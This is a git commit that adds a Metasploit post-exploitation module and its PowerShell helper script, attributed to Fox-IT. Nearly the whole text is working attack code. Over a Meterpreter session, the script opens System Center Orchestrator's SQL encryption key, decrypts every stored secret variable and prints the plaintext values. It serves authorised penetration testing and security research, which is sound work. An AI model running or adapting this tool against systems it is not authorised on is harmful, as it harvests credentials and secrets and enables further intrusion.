463dd158ec82cb2b163dbeb1cecc8eb04e19dc68
Rindert Kramer <rindert.kramer@fox-it.com>
2018-04-25 16:39:11 +0200

    New post module to decrypt Orchestrator secret variables

---
+++ data/post/powershell/Decrypt-OrchestratorVariables.ps1
@@ -0,0 +1,131 @@
+﻿
+# Rindert Kramer
+# Fox-IT
+# Reference: 
+#       https://blog.fox-it.com/
+
+function Get-_Help {
+
+    $helpMsg = @"
+
+    This tool can be used to decrypt Orchestrator variables. 
+    More information: https://blog.fox-it.com/
+
+    Required parameters:
+        DatabaseServer  : DatabaseServer. <localhost\SQLEXPRESS>
+        database        : Name of the database. Defaults to Orchestrator
+  
+    Optional parameters:
+        dbaUsername     : DBA Username
+        dbaPassword     : DBA Password
+
+
+    The tool will use integrated authentication, unless dbaUsername and dbaPassword are specified. 
+    MSSQL integrated login will then be used.
+
+    Usage: ./Decrypt-OrchestratorVariables.ps1 -databaseServer <location>`r`n   
+"@
+
+    Write-Host $helpMsg
+}
+
+function Get-CryptedContent ([string]$content) {
+
+    [regex]$r = '^.+\/(?<value>.+)\\.+$'
+    if (-not $r.IsMatch($content)) {
+        return [string]::Empty
+    }
+
+    $m = $r.Match($content)
+    return $m.Groups['value'].Value
+}
+
+function Decrypt-OrchestratorVariables([string]$_databaseServer, [string]$_database, [string]$_userName = [string]::Empty, [string]$_password = [string]::Empty) {       
+
+    # Build connectionstring based on parameter input
+    $connectionString = [string]::Empty
+    if ([string]::IsNullOrEmpty($userName)) {
+        $connectionString = "Server=$databaseServer;Database=$database;Integrated Security=True;"
+    } else {
+        $connectionString = "Server=$databaseServer;uid=$userName;pwd=$password;Database=$database;Integrated Security=False;"
+    }
+
+    $connection  = New-Object System.Data.SqlClient.SqlConnection
+    $command     = New-Object System.Data.SqlClient.SqlCommand
+    $resultTable = New-Object System.Data.DataTable
+    $results = @()
+
+    # Query to open decryption key
+    $qOpenKeys = 'OPEN SYMMETRIC KEY ORCHESTRATOR_SYM_KEY DECRYPTION BY ASYMMETRIC KEY ORCHESTRATOR_ASYM_KEY;'
+
+    try {
+        $connection.ConnectionString = $connectionString
+        $connection.Open()
+                
+        $command.Connection = $connection
+
+        # Open decryption key for this session
+        $command.CommandText = $qOpenKeys
+        [void]$command.ExecuteNonQuery()
+
+        # Query all variables
+        $qVariables = "Select VARIABLES.value, objects.Name From VARIABLES INNER JOIN OBJECTS ON OBJECTS.UniqueID = VARIABLES.UniqueID;"
+        $command.CommandText = $qVariables
+        [void]$resultTable.Load($command.ExecuteReader())       
+
+        # Get all encrypted content
+        foreach ($result in $resultTable | where {$_.value -match '^.+\/(?<value>.+)\\.+$'}) {
+            
+            $tmpTable = New-Object System.Data.DataTable
+
+            # Get crypted value
+            $cryptedContent = Get-CryptedContent -content $result.value      
+            
+            if ($cryptedContent -eq [string]::Empty) {
+                # Maybe regex is wrong or value is not encrypted?
+                # TODO: display warning?
+                continue
+            }  
+
+            # Decrypt ith MSSQL encryption key
+            $qDecrypt = "select convert(nvarchar, decryptbykey(0x$cryptedContent));"
+            $command.CommandText = $qDecrypt
+            $tmpTable.Load($command.ExecuteReader())
+            
+            if ($tmpTable.Rows.Count -le 0) {
+                # TODO: No result, display warning?
+                continue
+            }
+            
+            $decryptedResult = $tmpTable.Rows[0][0].Replace("`0",$null) # Remove nullbytes 
+            $varName = $result.Name
+
+            $results += "[*]$varName [+]$decryptedResult"
+            
+            if (-not $tmpTable.Disposed) { $tmpTable.Dispose() }
+        }
+    }
+
+    catch {
+        throw 'Unable to extract Orchestrator secrets. Check script settings.'
+    }
+
+    finally {
+
+        # cleanup
+        $connection.Dispose()
+        $command.Dispose()
+        $resultTable.Dispose()
+    }
+
+    $results
+}
+
+[string]$databaseServer = '__db_server__'
+[string]$database = '__database__'
+[string]$dbaUsername = '__dba_username__'
+[string]$dbaPassword = '__dba_password__'
+
+
+Decrypt-OrchestratorVariables -_databaseServer $DatabaseServer -_database $Database -_userName $dbaUsername -_password $dbaPassword
+
---
+++ modules/post/windows/gather/orchestrator_secret_variables_decrypt.rb
@@ -0,0 +1,74 @@
+require 'msf/core/post/common'
+require 'msf/core/exploit/powershell'
+
+class MetasploitModule < Msf::Post
+  include Msf::Post::Windows::Powershell
+  include Msf::Exploit::Powershell
+  include Msf::Post::Common
+  include Msf::Auxiliary::Report
+  include Msf::Post::File
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'Orchestrator secret variables decryptor',
+      'Description' => %q{
+        It is possible to store variables with encrypted content within Orchestrator. The encryption key is stored in
+        the SYS table. If you have access to the SYS table it is possible to decrypt the secret variables.
+        Integrated authentication will be used unless DBA_USERNAME and DBA_PASSWORD are specified.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Rindert Kramer <rindert.kramer[at]fox-it.com>',
+        ],
+        'References'  =>
+        [
+          ['URL', 'https://blog.fox-it.com/']
+        ],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter']))
+
+    register_options(
+      [
+        OptString.new('SQLSERVER', [true, 'Name of database server']),
+        OptString.new('DATABASE', [true, 'Name of Orchestrator database','Orchestrator']),
+        OptString.new('DBA_USERNAME', [false, 'Username to connect to MSSQL']),
+        OptString.new('DBA_PASSWORD', [false, 'Password to connect to MSSQL']),
+        OptInt.new('SCRIPT_TIMEOUT', [true, 'Script timeout', 120]),
+      ]
+    )
+  end
+
+  def run
+
+    # read values from datastore
+    sql_server = datastore['SQLSERVER']
+    database = datastore['DATABASE']
+    dba_username = datastore['DBA_USERNAME']
+    dba_password = datastore['DBA_PASSWORD']
+    script_timeout = datastore['SCRIPT_TIMEOUT']
+
+    if !have_powershell?
+      print_error('PowerShell is not installed! STOPPING')
+      return
+    end
+
+    # Read script, replace placeholders with parameters
+    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "Decrypt-OrchestratorVariables.ps1"))
+    base_script.gsub! '__db_server__', sql_server
+    base_script.gsub! '__database__', database
+    base_script.gsub! '__dba_username__', dba_username.to_s()
+    base_script.gsub! '__dba_password__', dba_password.to_s()
+
+    eof = Rex::Text.rand_text_alpha(8)
+    cmd_out, _running_pids, _open_channels = execute_script(base_script, script_timeout)
+    ps_output = get_ps_output(cmd_out, eof, script_timeout)
+
+    # Extract values from output with regex
+    regex = /^\[\*\](?<varname>.+)\s\[\+\](?<value>.+)$/
+    ps_output.scan(regex).each do |success|
+      print_good("")
+      print_good("Variable: #{success[0]}")
+      print_good("Decrypted value: #{success[1]}")
+    end
+  end
+end
